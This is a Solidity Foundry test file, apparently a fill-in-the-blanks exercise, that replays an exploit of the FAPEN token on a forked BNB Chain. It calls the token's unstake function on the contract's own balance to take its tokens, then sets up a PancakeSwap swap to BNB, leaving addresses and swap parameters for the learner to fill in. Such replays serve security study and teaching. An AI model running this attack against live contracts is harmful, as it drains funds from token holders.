// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./interface.sol";

contract Fapen is Test {
    
    // Step 1: Find out the contract addresses of FAPEN and WBNB and put them in the empty brackets below
    IFapen FAPEN = IFapen();
    IERC20 WBNB = IERC20();
    IPancakeRouter Router =
        IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IPancakePair Pair = IPancakePair(0x1d1043D07B842c97a948E51c50470FDc7A02B9da);

    function setUp() external {
        vm.createSelectFork("https://rpc.ankr.com/bsc", 28637846);
    }

    function testFapenExploit() external {
        vm.deal(address(this), 0);
        console.log("Attacker BNB Balance at start:", address(this).balance);  
        uint amt = FAPEN.balanceOf(address(FAPEN));
        FAPEN.unstake(amt); 
        emit log_named_decimal_uint(
            "Amount of FAPEN after calling unstake",
            FAPEN.balanceOf(address(this)),
            9
        );

        FAPEN.approve(address(Router), type(uint).max);

        // Step 2: Fill the input parameters up with the appropriate data
        // Router.swapExactTokensForETHSupportingFeeOnTransferTokens(amountIn, amountOutMin, path, to, deadline); 
        emit log_named_decimal_uint(
            "Amount of BNB after attack",
            address(this).balance,
            18
        );
    }

    receive() external payable {}
}